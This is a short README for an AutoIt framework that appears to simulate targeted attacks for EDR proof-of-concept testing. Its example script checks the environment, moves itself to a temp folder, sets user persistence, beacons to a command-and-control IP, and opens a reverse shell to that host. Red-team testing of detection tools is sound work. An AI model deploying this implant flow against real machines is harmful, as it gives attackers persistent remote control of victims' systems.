# APT SimulActor

## Introduction

Targeted attacks are not random in nature and are usually composed of different phases like infection, data exfiltration and persistency.
APT SimulActor is a little framework based on AutoIT libraries for basic EDR POCs.

## Example Code
```
#include "libs/settings.au3"
#include "libs/network.au3"
#include "libs/info.au3"
#include "libs/misc.au3"

$victim = "john"
$c2_ip = "192.168.231.106"
$c2_port = "444"
$timer = 60

init()

if InternetCheck() Then

   If numberOfLogins(whoami()) > 2 Then

	  Move2Temp()

	  SetPersistent4CurrentUser()

	  While $timer > 0

		 HttpPost($c2_ip, "Timer:", $timer)
		 Sleep(1000)
 		 $timer = $timer - 1

	  WEnd

	  ReverseShell($c2_ip, $c2_port)

   EndIf

EndIf
```



## Prerequisites

AutoIt Downloads [link](https://www.autoitscript.com/site/autoit/downloads/)
